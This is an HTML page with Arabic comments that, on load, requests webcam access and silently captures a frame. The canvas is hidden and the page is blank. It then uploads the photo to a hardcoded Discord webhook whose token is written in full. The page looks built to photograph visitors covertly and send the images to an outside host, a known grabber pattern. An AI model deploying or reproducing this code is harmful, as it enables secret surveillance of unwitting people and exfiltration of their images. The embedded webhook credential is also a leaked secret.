<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا ويب - إرسال إلى Discord</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>

    <script>
        const canvas = document.getElementById("canvas");
        let images = [];

        // تحقق مما إذا كان المتصفح يدعم MediaDevices و getUserMedia
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert("المتصفح الخاص بك لا يدعم الوصول إلى الكاميرات. يُرجى تحديث المتصفح.");
        }

        // الدالة لبدء كاميرات الويب
        async function initCamera() {
            try {
                // الحصول على تدفق الكاميرا (أول كاميرا متاحة)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.width = 640;
                video.height = 480;
                video.muted = true;  // التأكد من أن الفيديو مُكبّت
                video.play();

                // الانتظار حتى يبدأ الفيديو في التشغيل ثم التقاط الصورة
                video.onplaying = () => {
                    captureAndSend(video);
                };

            } catch (error) {
                alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
            }
        }

        // التقاط الصورة من الفيديو
        function captureAndSend(video) {
            // إعداد الـCanvas لرسم الفيديو
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى base64
            const imageData = canvas.toDataURL("image/png");

            // إضافة الصورة إلى قائمة الصور
            images.push(imageData);
            console.log("تم التقاط الصورة من الكاميرا.");

            // إرسال الصورة إلى Discord
            sendToDiscord(images);
        }

        // إرسال الصورة إلى Webhook في Discord
        async function sendToDiscord(images) {
            const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";  // ضع هنا رابط الـWebhook الخاص بك
            const formData = new FormData();

            // تحويل الصورة إلى Blob وإضافتها إلى الـ FormData
            images.forEach((imageData, index) => {
                const blob = dataURItoBlob(imageData);
                formData.append("file", blob, `image${index + 1}.png`);
            });

            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    body: formData
                });

                if (response.ok) {
                    console.log("تم إرسال الصورة بنجاح!");
                } else {
                    const errorText = await response.text();
                    console.error("فشل في إرسال الصورة إلى Discord:", errorText);
                }
            } catch (error) {
                console.error("حدث خطأ أثناء إرسال الصورة.", error);
            }
        }

        // تحويل البيانات من base64 إلى Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const uintArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([uintArray], { type: "image/png" });
        }

        // بدء الكاميرا عند تحميل الصفحة
        window.onload = initCamera;
    </script>
</body>
</html>
